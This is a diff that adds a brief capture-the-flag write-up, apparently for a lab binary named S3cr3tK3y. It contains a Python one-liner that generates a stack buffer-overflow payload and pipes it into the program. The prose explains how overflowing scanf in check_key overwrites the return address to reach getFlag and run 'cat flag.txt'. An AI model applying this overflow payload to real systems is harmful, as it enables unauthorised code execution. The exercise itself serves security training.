@@ -1,0 +1,7 @@
+Command - python -c 'print (chr(0x5b)+chr(0x86)+chr(0x04)+chr(0x08))*24 + (chr(0x0)+chr(0x89)+chr(0x04)+chr(0x08))*8' | ./S3cr3tK3y
+
+In this main is is calling check_key which in turn calling scanf where I did Buffer Overflow stack exploit.
+
+I overwrite the check_key's return to point to getFlag function which is making a syscall.
+
+Also the location of "cat flag.txt" is given to execute it to get the flag. The secret program is telling, is this location.
